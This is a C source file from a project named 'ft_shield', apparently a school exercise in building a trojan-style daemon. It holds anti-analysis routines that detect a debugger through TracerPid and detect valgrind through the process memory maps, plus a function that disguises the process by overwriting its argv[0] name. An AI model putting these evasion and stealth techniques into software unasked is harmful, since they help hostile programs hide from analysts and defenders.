#include "ft_shield.h"

int	is_debugger_attached()
{
	FILE *file = fopen("/proc/self/status", "r");

	if (file == NULL) {
		ft_perror("/proc/self/status");
		return (1);
	}

	while (1) {
		char line[256] = {0};

		if (fgets(line, sizeof(line), file) == NULL)
			break;
		if (strstr(line, "TracerPid:")) {
			int pid = atoi(line + 10);
			if (pid != 0) {
				ft_dprintf(2, "Error: running inside a debugger\n");
				fclose(file);
				return (1);
			}
			break;
		}
	}

	fclose(file);
	return (0);
}

int	is_valgrind_running()
{
	FILE *file = fopen("/proc/self/maps", "r");

	if (file == NULL) {
		ft_perror("/proc/self/maps");
		return (1);
	}

	while (1) {
		char line[256] = {0};

		if (fgets(line, sizeof(line), file) == NULL)
			break;
		if (strstr(line, "valgrind")) {
			ft_dprintf(2, "Running on valgrind\n");
			fclose(file);
			return (1);
		}
	}

	fclose(file);
	return (0);
}

void	hide_process_name(char **argv)
{
	size_t len = strlen(argv[0]);
	memset(argv[0], 0, len);
	strncpy(argv[0], "PyS <3", len - 1);
}

